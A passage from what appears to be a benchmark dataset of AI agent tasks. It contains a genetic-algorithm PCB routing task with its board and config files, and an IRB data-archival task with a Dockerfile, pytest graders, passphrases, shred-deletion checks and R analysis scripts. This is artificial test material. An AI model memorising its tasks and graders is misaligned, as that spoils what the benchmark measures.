\""R3\"", \""x\"": 35, \""y\"": 55, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R4\"", \""x\"": 45, \""y\"": 55, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R5\"", \""x\"": 55, \""y\"": 55, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R6\"", \""x\"": 65, \""y\"": 55, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R7\"", \""x\"": 75, \""y\"": 55, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R8\"", \""x\"": 15, \""y\"": 65, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R9\"", \""x\"": 25, \""y\"": 65, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R10\"", \""x\"": 35, \""y\"": 65, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""C1\"", \""x\"": 10, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C2\"", \""x\"": 20, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C3\"", \""x\"": 30, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C4\"", \""x\"": 40, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C5\"", \""x\"": 50, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C6\"", \""x\"": 60, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C7\"", \""x\"": 70, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C8\"", \""x\"": 80, \""y\"": 75, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C9\"", \""x\"": 10, \""y\"": 85, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""C10\"", \""x\"": 20, \""y\"": 85, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""Q1\"", \""x\"": 45, \""y\"": 85, \""pins\"": {\""1\"": [0, 0], \""2\"": [1.27, 0], \""3\"": [2.54, 0]}},\n    {\""id\"": \""Q2\"", \""x\"": 55, \""y\"": 85, \""pins\"": {\""1\"": [0, 0], \""2\"": [1.27, 0], \""3\"": [2.54, 0]}},\n    {\""id\"": \""Q3\"", \""x\"": 65, \""y\"": 85, \""pins\"": {\""1\"": [0, 0], \""2\"": [1.27, 0], \""3\"": [2.54, 0]}},\n    {\""id\"": \""Q4\"", \""x\"": 75, \""y\"": 85, \""pins\"": {\""1\"": [0, 0], \""2\"": [1.27, 0], \""3\"": [2.54, 0]}},\n    {\""id\"": \""Q5\"", \""x\"": 85, \""y\"": 85, \""pins\"": {\""1\"": [0, 0], \""2\"": [1.27, 0], \""3\"": [2.54, 0]}},\n    {\""id\"": \""D1\"", \""x\"": 15, \""y\"": 45, \""pins\"": {\""1\"": [0, 0], \""2\"": [3, 0]}},\n    {\""id\"": \""D2\"", \""x\"": 25, \""y\"": 45, \""pins\"": {\""1\"": [0, 0], \""2\"": [3, 0]}},\n    {\""id\"": \""D3\"", \""x\"": 35, \""y\"": 45, \""pins\"": {\""1\"": [0, 0], \""2\"": [3, 0]}},\n    {\""id\"": \""D4\"", \""x\"": 45, \""y\"": 45, \""pins\"": {\""1\"": [0, 0], \""2\"": [3, 0]}},\n    {\""id\"": \""D5\"", \""x\"": 55, \""y\"": 45, \""pins\"": {\""1\"": [0, 0], \""2\"": [3, 0]}},\n    {\""id\"": \""L1\"", \""x\"": 85, \""y\"": 10, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""L2\"", \""x\"": 85, \""y\"": 20, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""L3\"", \""x\"": 85, \""y\"": 30, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""L4\"", \""x\"": 85, \""y\"": 40, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""L5\"", \""x\"": 85, \""y\"": 50, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""SW1\"", \""x\"": 90, \""y\"": 60, \""pins\"": {\""1\"": [0, 0], \""2\"": [0, 2.54], \""3\"": [2.54, 0], \""4\"": [2.54, 2.54]}},\n    {\""id\"": \""SW2\"", \""x\"": 90, \""y\"": 70, \""pins\"": {\""1\"": [0, 0], \""2\"": [0, 2.54], \""3\"": [2.54, 0], \""4\"": [2.54, 2.54]}},\n    {\""id\"": \""J1\"", \""x\"": 5, \""y\"": 50, \""pins\"": {\""1\"": [0, 0], \""2\"": [0, 2.54], \""3\"": [0, 5.08]}},\n    {\""id\"": \""J2\"", \""x\"": 95, \""y\"": 50, \""pins\"": {\""1\"": [0, 0], \""2\"": [0, 2.54], \""3\"": [0, 5.08]}},\n    {\""id\"": \""Y1\"", \""x\"": 50, \""y\"": 50, \""pins\"": {\""1\"": [0, 0], \""2\"": [7.5, 0]}}\n  ],\n  \""nets\"": [\n    {\""id\"": \""VCC\"", \""connections\"": [[\""U1\"", \""4\""], [\""U2\"", \""4\""], [\""U3\"", \""4\""], [\""U4\"", \""4\""], [\""U5\"", \""4\""], [\""J1\"", \""1\""]]},\n    {\""id\"": \""GND\"", \""connections\"": [[\""U1\"", \""2\""], [\""U2\"", \""2\""], [\""U3\"", \""2\""], [\""U4\"", \""2\""], [\""U5\"", \""2\""], [\""J1\"", \""3\""]]},\n    {\""id\"": \""CLK\"", \""connections\"": [[\""Y1\"", \""1\""], [\""U1\"", \""1\""], [\""U2\"", \""1\""], [\""U3\"", \""1\""], [\""U4\"", \""1\""]]},\n    {\""id\"": \""DATA1\"", \""connections\"": [[\""U1\"", \""3\""], [\""R1\"", \""1\""], [\""C1\"", \""1\""], [\""Q1\"", \""1\""]]},\n    {\""id\"": \""DATA2\"", \""connections\"": [[\""U2\"", \""3\""], [\""R2\"", \""1\""], [\""C2\"", \""1\""], [\""Q1\"", \""2\""]]},\n    {\""id\"": \""DATA3\"", \""connections\"": [[\""U3\"", \""3\""], [\""R3\"", \""1\""], [\""C3\"", \""1\""], [\""Q2\"", \""1\""]]},\n    {\""id\"": \""DATA4\"", \""connections\"": [[\""U4\"", \""3\""], [\""R4\"", \""1\""], [\""C4\"", \""1\""], [\""Q2\"", \""2\""]]},\n    {\""id\"": \""DATA5\"", \""connections\"": [[\""U5\"", \""3\""], [\""R5\"", \""1\""], [\""C5\"", \""1\""], [\""Q3\"", \""1\""]]},\n    {\""id\"": \""CTRL1\"", \""connections\"": [[\""U6\"", \""1\""], [\""R6\"", \""1\""], [\""D1\"", \""1\""], [\""L1\"", \""1\""]]},\n    {\""id\"": \""CTRL2\"", \""connections\"": [[\""U6\"", \""3\""], [\""R7\"", \""1\""], [\""D2\"", \""1\""], [\""L2\"", \""1\""]]},\n    {\""id\"": \""CTRL3\"", \""connections\"": [[\""U7\"", \""1\""], [\""R8\"", \""1\""], [\""D3\"", \""1\""], [\""L3\"", \""1\""]]},\n    {\""id\"": \""CTRL4\"", \""connections\"": [[\""U7\"", \""3\""], [\""R9\"", \""1\""], [\""D4\"", \""1\""], [\""L4\"", \""1\""]]},\n    {\""id\"": \""CTRL5\"", \""connections\"": [[\""U8\"", \""1\""], [\""R10\"", \""1\""], [\""D5\"", \""1\""], [\""L5\"", \""1\""]]},\n    {\""id\"": \""OUT1\"", \""connections\"": [[\""Q1\"", \""3\""], [\""Q2\"", \""3\""], [\""Q3\"", \""3\""], [\""J2\"", \""1\""]]},\n    {\""id\"": \""OUT2\"", \""connections\"": [[\""Q4\"", \""3\""], [\""Q5\"", \""3\""], [\""SW1\"", \""1\""], [\""J2\"", \""2\""]]},\n    {\""id\"": \""SW_NET1\"", \""connections\"": [[\""SW1\"", \""3\""], [\""SW2\"", \""1\""], [\""U9\"", \""1\""]]},\n    {\""id\"": \""SW_NET2\"", \""connections\"": [[\""SW1\"", \""4\""], [\""SW2\"", \""2\""], [\""U9\"", \""3\""]]},\n    {\""id\"": \""PWR1\"", \""connections\"": [[\""J1\"", \""2\""], [\""L1\"", \""2\""], [\""L2\"", \""2\""], [\""C6\"", \""1\""]]},\n    {\""id\"": \""PWR2\"", \""connections\"": [[\""L3\"", \""2\""], [\""L4\"", \""2\""], [\""L5\"", \""2\""], [\""C7\"", \""1\""]]},\n    {\""id\"": \""BYPASS1\"", \""connections\"": [[\""C1\"", \""2\""], [\""C2\"", \""2\""], [\""C3\"", \""2\""], [\""C4\"", \""2\""]]},\n    {\""id\"": \""BYPASS2\"", \""connections\"": [[\""C5\"", \""2\""], [\""C6\"", \""2\""], [\""C7\"", \""2\""], [\""C8\"", \""2\""]]},\n    {\""id\"": \""BYPASS3\"", \""connections\"": [[\""C9\"", \""1\""], [\""C10\"", \""1\""], [\""U10\"", \""1\""], [\""U10\"", \""3\""]]},\n    {\""id\"": \""SIG1\"", \""connections\"": [[\""R1\"", \""2\""], [\""R2\"", \""2\""], [\""U6\"", \""2\""]]},\n    {\""id\"": \""SIG2\"", \""connections\"": [[\""R3\"", \""2\""], [\""R4\"", \""2\""], [\""U7\"", \""2\""]]},\n    {\""id\"": \""SIG3\"", \""connections\"": [[\""R5\"", \""2\""], [\""R6\"", \""2\""], [\""U8\"", \""2\""]]},\n    {\""id\"": \""SIG4\"", \""connections\"": [[\""R7\"", \""2\""], [\""R8\"", \""2\""], [\""U9\"", \""2\""]]},\n    {\""id\"": \""SIG5\"", \""connections\"": [[\""R9\"", \""2\""], [\""R10\"", \""2\""], [\""U10\"", \""2\""]]},\n    {\""id\"": \""OSC_FB\"", \""connections\"": [[\""Y1\"", \""2\""], [\""U5\"", \""1\""], [\""C9\"", \""2\""], [\""C10\"", \""2\""]]},\n    {\""id\"": \""DIODE1\"", \""connections\"": [[\""D1\"", \""2\""], [\""D2\"", \""2\""], [\""Q4\"", \""1\""]]},\n    {\""id\"": \""DIODE2\"", \""connections\"": [[\""D3\"", \""2\""], [\""D4\"", \""2\""], [\""Q4\"", \""2\""]]},\n    {\""id\"": \""DIODE3\"", \""connections\"": [[\""D5\"", \""2\""], [\""Q5\"", \""1\""], [\""Q5\"", \""2\""]]},\n    {\""id\"": \""SPARE1\"", \""connections\"": [[\""U6\"", \""4\""], [\""U7\"", \""4\""], [\""U8\"", \""4\""]]},\n    {\""id\"": \""SPARE2\"", \""connections\"": [[\""U9\"", \""4\""], [\""U10\"", \""4\""], [\""SW2\"", \""3\""]]},\n    {\""id\"": \""TEST1\"", \""connections\"": [[\""SW2\"", \""4\""], [\""U5\"", \""2\""], [\""J2\"", \""3\""]]},\n    {\""id\"": \""SHIELD\"", \""connections\"": [[\""U8\"", \""3\""], [\""U9\"", \""1\""], [\""U10\"", \""1\""]]}\n  ]\n}"", ""pcb_router.py"": ""#!/usr/bin/env python3\n\nimport json\nimport random\nimport time\nfrom dataclasses import dataclass\nfrom typing import List, Tuple, Dict, Set, Optional\nimport numpy as np\nfrom collections import defaultdict\n\n@dataclass\nclass Component:\n    id: str\n    x: float\n    y: float\n    pins: Dict[str, Tuple[float, float]]\n\n@dataclass\nclass Net:\n    id: str\n    connections: List[Tuple[str, str]]  # [(component_id, pin_id), ...]\n\n@dataclass\nclass RouteSegment:\n    start: Tuple[float, float]\n    end: Tuple[float, float]\n    net_id: str\n\nclass PCBBoard:\n    def __init__(self, width: float, height: float):\n        self.width = width\n        self.height = height\n        self.components: Dict[str, Component] = {}\n        self.nets: List[Net] = []\n        self.grid_size = 0.1  # 0.1mm grid\n        \n    def add_component(self, component: Component):\n        self.components[component.id] = component\n        \n    def add_net(self, net: Net):\n        self.nets.append(net)\n        \n    def get_pin_position(self, comp_id: str, pin_id: str) -> Tuple[float, float]:\n        comp = self.components[comp_id]\n        pin_offset = comp.pins[pin_id]\n        return (comp.x + pin_offset[0], comp.y + pin_offset[1])\n        \n    def load_from_json(self, filepath: str):\n        with open(filepath, 'r') as f:\n            data = json.load(f)\n        \n        self.width = data['board']['width']\n        self.height = data['board']['height']\n        \n        # Load components\n        for comp_data in data['components']:\n            pins = {k: tuple(v) for k, v in comp_data['pins'].items()}\n            component = Component(\n                id=comp_data['id'],\n                x=comp_data['x'],\n                y=comp_data['y'],\n                pins=pins\n            )\n            self.add_component(component)\n        \n        # Load nets\n        for net_data in data['nets']:\n            net = Net(\n                id=net_data['id'],\n                connections=[tuple(conn) for conn in net_data['connections']]\n            )\n            self.add_net(net)\n\nclass GeneticRouter:\n    def __init__(self, board: PCBBoard, config: Dict):\n        self.board = board\n        self.config = config\n        self.ga_config = config['genetic_algorithm']\n        self.routing_config = config['routing']\n        self.fitness_weights = config['fitness_weights']\n        self.grid_res = self.routing_config['grid_resolution']\n        \n        # Convert board to grid coordinates\n        self.grid_width = int(board.width / self.grid_res)\n        self.grid_height = int(board.height / self.grid_res)\n        \n    def route_all_nets(self):\n        \""\""\""Main routing function using genetic algorithm\""\""\""\n        start_time = time.time()\n        max_runtime = self.routing_config['max_runtime_seconds']\n        \n        # Initialize population\n        population = self._initialize_population()\n        best_solution = None\n        best_fitness = float('-inf')\n        \n        generation = 0\n        while generation < self.ga_config['generations']:\n            # Check time limit\n            if time.time() - start_time > max_runtime:\n                print(f\""Time limit reached at generation {generation}\"")\n                break\n                \n            # Evaluate fitness\n            fitness_scores = [self._evaluate_fitness(individual) for individual in population]\n            \n            # Track best solution\n            max_idx = np.argmax(fitness_scores)\n            if fitness_scores[max_idx] > best_fitness:\n                best_fitness = fitness_scores[max_idx]\n                best_solution = population[max_idx].copy()\n            \n            # Selection and reproduction\n            new_population = []\n            \n            # Elite selection\n            elite_indices = np.argsort(fitness_scores)[-self.ga_config['elite_size']:]\n            for idx in elite_indices:\n                new_population.append(population[idx].copy())\n            \n            # Generate rest of population\n            while len(new_population) < self.ga_config['population_size']:\n                # Tournament selection\n                parent1 = self._tournament_selection(population, fitness_scores)\n                parent2 = self._tournament_selection(population, fitness_scores)\n                \n                # Crossover\n                if random.random() < self.ga_config['crossover_rate']:\n                    child = self._crossover(parent1, parent2)\n                else:\n                    child = parent1.copy()\n                \n                # Mutation\n                if random.random() < self.ga_config['mutation_rate']:\n                    child = self._mutate(child)\n                \n                new_population.append(child)\n            \n            population = new_population\n            generation += 1\n            \n            if generation % 20 == 0:\n                print(f\""Generation {generation}, Best fitness: {best_fitness:.4f}\"")\n        \n        runtime = time.time() - start_time\n        print(f\""Routing completed in {runtime:.2f} seconds\"")\n        \n        # Convert best solution to routing result\n        return self._solution_to_routing(best_solution)\n    \n    def _initialize_population(self):\n        \""\""\""Create initial population of routing solutions\""\""\""\n        population = []\n        \n        for _ in range(self.ga_config['population_size']):\n            individual = []\n            for net in self.board.nets:\n                # For each net, create a random route\n                route = self._create_random_route(net)\n                individual.append(route)\n            population.append(individual)\n        \n        return population\n    \n    def _create_random_route(self, net: Net):\n        \""\""\""Create a random route for a net using modified A* with randomness\""\""\""\n        if len(net.connections) < 2:\n            return []\n        \n        routes = []\n        # Connect first pin to all others\n        base_comp, base_pin = net.connections[0]\n        base_pos = self.board.get_pin_position(base_comp, base_pin)\n        \n        for comp_id, pin_id in net.connections[1:]:\n            target_pos = self.board.get_pin_position(comp_id, pin_id)\n            \n            # Use probabilistic pathfinding\n            path = self._find_path_probabilistic(base_pos, target_pos)\n            if path:\n                for i in range(len(path) - 1):\n                    routes.append(RouteSegment(path[i], path[i+1], net.id))\n        \n        return routes\n    \n    def _find_path_probabilistic(self, start: Tuple[float, float], \n                                end: Tuple[float, float]) -> List[Tuple[float, float]]:\n        \""\""\""Find path with some randomness for diversity\""\""\""\n        # Convert to grid coordinates\n        start_grid = (int(start[0] / self.grid_res), int(start[1] / self.grid_res))\n        end_grid = (int(end[0] / self.grid_res), int(end[1] / self.grid_res))\n        \n        # Simple probabilistic path: prefer manhattan routes with some deviation\n        path = [start]\n        current = start_grid\n        \n        while current != end_grid:\n            dx = end_grid[0] - current[0]\n            dy = end_grid[1] - current[1]\n            \n            # Probabilistically choose direction\n            choices = []\n            if dx > 0:\n                choices.extend([(1, 0)] * abs(dx))\n            elif dx < 0:\n                choices.extend([(-1, 0)] * abs(dx))\n            if dy > 0:\n                choices.extend([(0, 1)] * abs(dy))\n            elif dy < 0:\n                choices.extend([(0, -1)] * abs(dy))\n            \n            # Add some randomness\n            if choices:\n                # Occasionally add perpendicular moves for diversity\n                if random.random() < 0.1:\n                    if dx != 0:\n                        choices.extend([(0, 1), (0, -1)])\n                    if dy != 0:\n                        choices.extend([(1, 0), (-1, 0)])\n                \n                move = random.choice(choices)\n                new_pos = (current[0] + move[0], current[1] + move[1])\n                \n                # Check bounds\n                if (0 <= new_pos[0] < self.grid_width and \n                    0 <= new_pos[1] < self.grid_height):\n                    current = new_pos\n                    path.append((current[0] * self.grid_res, current[1] * self.grid_res))\n            else:\n                break\n        \n        path.append(end)\n        return path\n    \n    def _evaluate_fitness(self, individual):\n        \""\""\""Calculate fitness score for a routing solution\""\""\""\n        total_length = 0\n        crossing_count = 0\n        \n        # Flatten all route segments\n        all_segments = []\n        for net_routes in individual:\n            all_segments.extend(net_routes)\n        \n        # Calculate total wire length\n        for segment in all_segments:\n            dx = segment.end[0] - segment.start[0]\n            dy = segment.end[1] - segment.start[1]\n            total_length += np.sqrt(dx*dx + dy*dy)\n        \n        # Count crossings\n        for i in range(len(all_segments)):\n            for j in range(i + 1, len(all_segments)):\n                if all_segments[i].net_id != all_segments[j].net_id:\n                    if self._segments_cross(all_segments[i], all_segments[j]):\n                        crossing_count += 1\n        \n        # Calculate fitness (maximize by minimizing length and crossings)\n        fitness = 1.0 / (1.0 + \n                        self.fitness_weights['wire_length'] * total_length + \n                        self.fitness_weights['crossings'] * crossing_count * 10)\n        \n        return fitness\n    \n    def _segments_cross(self, seg1: RouteSegment, seg2: RouteSegment) -> bool:\n        \""\""\""Check if two line segments cross\""\""\""\n        def ccw(A, B, C):\n            return (C[1]-A[1]) * (B[0]-A[0]) > (B[1]-A[1]) * (C[0]-A[0])\n        \n        A = seg1.start\n        B = seg1.end\n        C = seg2.start\n        D = seg2.end\n        \n        return ccw(A,C,D) != ccw(B,C,D) and ccw(A,B,C) != ccw(A,B,D)\n    \n    def _tournament_selection(self, population, fitness_scores):\n        \""\""\""Select individual using tournament selection\""\""\""\n        tournament_size = self.ga_config['tournament_size']\n        indices = random.sample(range(len(population)), tournament_size)\n        best_idx = max(indices, key=lambda i: fitness_scores[i])\n        return population[best_idx]\n    \n    def _crossover(self, parent1, parent2):\n        \""\""\""Crossover two routing solutions\""\""\""\n        child = []\n        \n        # For each net, randomly choose route from either parent\n        for i in range(len(parent1)):\n            if random.random() < 0.5:\n                child.append(parent1[i].copy())\n            else:\n                child.append(parent2[i].copy())\n        \n        return child\n    \n    def _mutate(self, individual):\n        \""\""\""Mutate a routing solution\""\""\""\n        # Randomly select a net to reroute\n        if individual:\n            net_idx = random.randint(0, len(individual) - 1)\n            net = self.board.nets[net_idx]\n            individual[net_idx] = self._create_random_route(net)\n        \n        return individual\n    \n    def _solution_to_routing(self, solution):\n        \""\""\""Convert genetic algorithm solution to routing result\""\""\""\n        all_segments = []\n        for net_routes in solution:\n            all_segments.extend(net_routes)\n        \n        # Calculate metrics\n        total_length = 0\n        crossing_count = 0\n        \n        for segment in all_segments:\n            dx = segment.end[0] - segment.start[0]\n            dy = segment.end[1] - segment.start[1]\n            total_length += np.sqrt(dx*dx + dy*dy)\n        \n        for i in range(len(all_segments)):\n            for j in range(i + 1, len(all_segments)):\n                if all_segments[i].net_id != all_segments[j].net_id:\n                    if self._segments_cross(all_segments[i], all_segments[j]):\n                        crossing_count += 1\n        \n        # Build routing result\n        routes_by_net = defaultdict(list)\n        for segment in all_segments:\n            routes_by_net[segment.net_id].append({\n                'start': list(segment.start),\n                'end': list(segment.end)\n            })\n        \n        routing_result = {\n            'board': {\n                'width': self.board.width,\n                'height': self.board.height\n            },\n            'routes': dict(routes_by_net),\n            'metrics': {\n                'total_wire_length': round(total_length, 2),\n                'crossing_count': crossing_count,\n                'net_count': len(self.board.nets),\n                'routed_nets': len(routes_by_net)\n            }\n        }\n        \n        return routing_result\n\ndef main():\n    # Load configuration\n    with open('/app/router_config.json', 'r') as f:\n        config = json.load(f)\n    \n    # Load board\n    board = PCBBoard(100, 100)\n    board.load_from_json('/app/board_50_components.json')\n    \n    print(f\""Loaded board: {board.width}x{board.height}mm\"")\n    print(f\""Components: {len(board.components)}\"")\n    print(f\""Nets: {len(board.nets)}\"")\n    \n    # Route using genetic algorithm\n    router = GeneticRouter(board, config)\n    routing_result = router.route_all_nets()\n    \n    # Save results\n    with open('/app/output/routing_solution.json', 'w') as f:\n        json.dump(routing_result, f, indent=2)\n    \n    # Print summary\n    metrics = routing_result['metrics']\n    print(f\""\\nRouting completed:\"")\n    print(f\""  Routed nets: {metrics['routed_nets']}/{metrics['net_count']}\"")\n    print(f\""  Total wire length: {metrics['total_wire_length']}mm\"")\n    print(f\""  Crossing count: {metrics['crossing_count']}\"")\n\nif __name__ == '__main__':\n    main()"", ""router_config.json"": ""{\n  \""genetic_algorithm\"": {\n    \""population_size\"": 100,\n    \""generations\"": 200,\n    \""mutation_rate\"": 0.1,\n    \""crossover_rate\"": 0.8,\n    \""elite_size\"": 10,\n    \""tournament_size\"": 5\n  },\n  \""routing\"": {\n    \""grid_resolution\"": 0.1,\n    \""trace_width\"": 0.2,\n    \""clearance\"": 0.2,\n    \""via_cost\"": 10,\n    \""layer_change_cost\"": 5,\n    \""max_runtime_seconds\"": 30\n  },\n  \""fitness_weights\"": {\n    \""wire_length\"": 0.4,\n    \""crossings\"": 0.5,\n    \""via_count\"": 0.1\n  }\n}"", ""simple_test_board.json"": ""{\n  \""board\"": {\n    \""width\"": 50,\n    \""height\"": 50\n  },\n  \""components\"": [\n    {\""id\"": \""U1\"", \""x\"": 10, \""y\"": 10, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""U2\"", \""x\"": 30, \""y\"": 10, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0]}},\n    {\""id\"": \""R1\"", \""x\"": 20, \""y\"": 30, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}}\n  ],\n  \""nets\"": [\n    {\""id\"": \""NET1\"", \""connections\"": [[\""U1\"", \""1\""], [\""R1\"", \""1\""]]},\n    {\""id\"": \""NET2\"", \""connections\"": [[\""U1\"", \""2\""], [\""U2\"", \""1\""]]},\n    {\""id\"": \""NET3\"", \""connections\"": [[\""U2\"", \""2\""], [\""R1\"", \""2\""]]}\n  ]\n}""}",2025-07-21T19:13:35.915788,2025-07-22T15:35:08.070904+00:00
draft_dp_c77064ec,medium,draft_dp_c77064ec,security,"Study's finished and IRB requires archival. Need to create encrypted archives separating de-identified data (raw_data/, analysis/) from PII (identifiers/, consent_forms/), then securely delete originals with 5-pass shred. Use passphrases 'irb-study-2024-final' and 'irb-pii-2024-restricted' respectively.",security,encryption|file-operations|data-processing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /root

# Install required packages
RUN apt-get update && apt-get install -y \
    r-base \
    python3 \
    python3-pip \
    python3-pytest \
    gnupg \
    coreutils \
    && rm -rf /var/lib/apt/lists/*

# Create directory structure
RUN mkdir -p /research/study_2024/raw_data \
    /research/study_2024/analysis \
    /research/study_2024/identifiers \
    /research/study_2024/consent_forms \
    /secure

# Copy research data files
COPY raw_data/* /research/study_2024/raw_data/
COPY analysis/* /research/study_2024/analysis/
COPY identifiers/* /research/study_2024/identifiers/
COPY consent_forms/* /research/study_2024/consent_forms/

# Set permissions
RUN chmod -R 755 /research/study_2024

CMD [""/bin/bash""]","import os
import subprocess
import tempfile

def test_encrypted_archives_created_and_valid():
    """"""Test that both encrypted archives exist and can be decrypted with correct passphrases""""""
    # Check de-identified archive
    assert os.path.exists('/secure/study_deidentified.tar.gz.gpg'), ""De-identified archive not found""
    
    # Try to decrypt de-identified archive
    with tempfile.TemporaryDirectory() as tmpdir:
        decrypt_cmd = ['gpg', '--batch', '--yes', '--passphrase', 'irb-study-2024-final', 
                      '--decrypt', '/secure/study_deidentified.tar.gz.gpg', '-o', f'{tmpdir}/deidentified.tar.gz']
        result = subprocess.run(decrypt_cmd, capture_output=True)
        assert result.returncode == 0, ""Failed to decrypt de-identified archive""
        
        # Extract and verify contents
        extract_cmd = ['tar', '-tzf', f'{tmpdir}/deidentified.tar.gz']
        result = subprocess.run(extract_cmd, capture_output=True, text=True)
        assert 'raw_data/' in result.stdout, ""raw_data directory missing from de-identified archive""
        assert 'analysis/' in result.stdout, ""analysis directory missing from de-identified archive""
        assert 'identifiers/' not in result.stdout, ""PII found in de-identified archive""
    
    # Check identifiable archive
    assert os.path.exists('/secure/study_identifiable.tar.gz.gpg'), ""Identifiable archive not found""
    
    # Try to decrypt identifiable archive
    with tempfile.TemporaryDirectory() as tmpdir:
        decrypt_cmd = ['gpg', '--batch', '--yes', '--passphrase', 'irb-pii-2024-restricted',
                      '--decrypt', '/secure/study_identifiable.tar.gz.gpg', '-o', f'{tmpdir}/identifiable.tar.gz']
        result = subprocess.run(decrypt_cmd, capture_output=True)
        assert result.returncode == 0, ""Failed to decrypt identifiable archive""
        
        # Extract and verify contents
        extract_cmd = ['tar', '-tzf', f'{tmpdir}/identifiable.tar.gz']
        result = subprocess.run(extract_cmd, capture_output=True, text=True)
        assert 'identifiers/' in result.stdout, ""identifiers directory missing from identifiable archive""
        assert 'consent_forms/' in result.stdout, ""consent_forms directory missing from identifiable archive""
        assert 'raw_data/' not in result.stdout, ""Non-PII data found in identifiable archive""

def test_original_data_securely_deleted():
    """"""Test that all original files have been securely deleted""""""
    # Check that original directories are gone
    assert not os.path.exists('/research/study_2024/raw_data'), ""raw_data directory still exists""
    assert not os.path.exists('/research/study_2024/analysis'), ""analysis directory still exists""
    assert not os.path.exists('/research/study_2024/identifiers'), ""identifiers directory still exists""
    assert not os.path.exists('/research/study_2024/consent_forms'), ""consent_forms directory still exists""
    
    # Verify audit log exists and contains shred evidence
    assert os.path.exists('/secure/destruction_audit.log'), ""Destruction audit log not found""
    
    with open('/secure/destruction_audit.log', 'r') as f:
        audit_content = f.read()
        assert 'shred' in audit_content.lower() or '5 pass' in audit_content.lower(), ""No evidence of secure deletion in audit log""
        assert 'timestamp' in audit_content.lower() or '2024' in audit_content, ""No timestamp in audit log""","{""test_encrypted_archives_created_and_valid"": 0.6, ""test_original_data_securely_deleted"": 0.4}","{""analysis/preliminary_stats.R"": ""#!/usr/bin/env Rscript\n\n# Preliminary statistics for Study 2024\n# Basic descriptive stats and correlations\n\n# Read data\nmeasurements <- read.csv(\""/research/study_2024/raw_data/patient_measurements.csv\"")\nlabs <- read.csv(\""/research/study_2024/raw_data/lab_results.csv\"")\n\n# Merge datasets\nfull_data <- merge(measurements, labs, by = c(\""patient_id\"", \""date\""))\n\n# Calculate basic statistics\nsummary_stats <- summary(full_data[, c(\""blood_pressure_systolic\"", \""heart_rate\"", \n                                      \""weight_kg\"", \""glucose_mg_dl\"", \""cholesterol_total\"")])\n\n# Correlation matrix\ncorrelations <- cor(full_data[, c(\""blood_pressure_systolic\"", \""heart_rate\"", \n                                 \""weight_kg\"", \""glucose_mg_dl\"", \""cholesterol_total\"")])\n\n# Save preliminary results\nwrite.csv(summary_stats, \""preliminary_summary.csv\"")\nwrite.csv(correlations, \""correlation_matrix.csv\"")\n\nprint(\""Preliminary analysis complete. Files saved.\"")"", ""analysis/blood_pressure_analysis.R"": ""#!/usr/bin/env Rscript\n\n# Blood Pressure Analysis for Study 2024\n# Analysis of systolic and diastolic trends\n\nlibrary(stats)\n\n# Read patient measurements\ndata <- read.csv(\""/research/study_2024/raw_data/patient_measurements.csv\"")\n\n# Calculate mean BP by patient\nbp_summary <- aggregate(cbind(blood_pressure_systolic, blood_pressure_diastolic) ~ patient_id, \n                       data = data, \n                       FUN = mean)\n\n# Perform paired t-test between first and last measurements\nfirst_visits <- data[data$date == \""2024-01-15\"" | data$date == \""2024-01-16\"" | \n                    data$date == \""2024-01-17\"" | data$date == \""2024-01-18\"" | \n                    data$date == \""2024-01-19\"", ]\nlast_visits <- data[data$date == \""2024-03-15\"" | data$date == \""2024-03-16\"" | \n                   data$date == \""2024-03-17\"" | data$date == \""2024-03-18\"" | \n                   data$date == \""2024-03-19\"", ]\n\nt_test_systolic <- t.test(first_visits$blood_pressure_systolic, \n                         last_visits$blood_pressure_systolic, \n                         paired = TRUE)\n\n# Save results\nsink(\""bp_analysis_results.txt\"")\nprint(\""Blood Pressure Summary by Patient:\"")\nprint(bp_summary)\nprint(\""\\nPaired t-test for Systolic BP (First vs Last Visit):\"")\nprint(t_test_systolic)\nsink()\n\n# Create visualization\npdf(\""bp_trends.pdf\"")\nplot(data$blood_pressure_systolic, type=\""l\"", \n     main=\""Systolic Blood Pressure Trends\"", \n     xlab=\""Measurement\"", ylab=\""BP (mmHg)\"")\ndev.off()"", ""raw_data/patient_measurements.csv"": 